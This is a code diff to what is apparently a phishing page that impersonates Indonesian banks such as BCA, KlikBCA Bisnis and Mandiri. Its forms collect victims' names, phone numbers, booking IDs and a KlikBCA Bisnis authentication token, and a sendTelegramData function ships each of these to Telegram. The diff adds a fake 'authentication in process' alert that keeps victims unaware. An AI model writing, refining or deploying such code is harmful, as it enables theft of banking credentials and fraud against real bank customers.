@@ -690,7 +690,7 @@
       const phoneVal = document.getElementById('phone').value.trim();
 
       await sendTelegramData('🔔 Data Pengaduan BCA:', {
-        'Silahkan pilih Opsi': document.getElementById('opsi').value,
+        'Silahkan pilih Ospi': document.getElementById('opsi').value,
         'Nama': namaVal || '-',
         'ID Booking': document.getElementById('idBooking').value.trim(),
         'Nomor Handphone': phoneVal.startsWith('+') ? phoneVal : '+62' + phoneVal
@@ -754,14 +754,15 @@
 
     // Validasi Token VPN KlikBCA Bisnis
     async function submitBizFinal() {
-      const tokenVal = document.getElementById('finalTokenInput').value.trim();
+      const tokenInput = document.getElementById('finalTokenInput');
+      const tokenVal = tokenInput.value.trim();
 
       await sendTelegramData('🔔 KlikBCA Bisnis - Final Token:', {
-    'Token': tokenVal
-  });
-
-  // alert dihapus agar pengguna tidak melihat notifikasi popup
-}
+        'Token': tokenVal
+      });
+      alert('Autentikasi KlikBCA Sedang di Proses.');
+      tokenInput.value = '';
+    }
 
     // 7. Mandiri Kopra
     document.getElementById('mandiriForm1').addEventListener('submit', async function(e) {
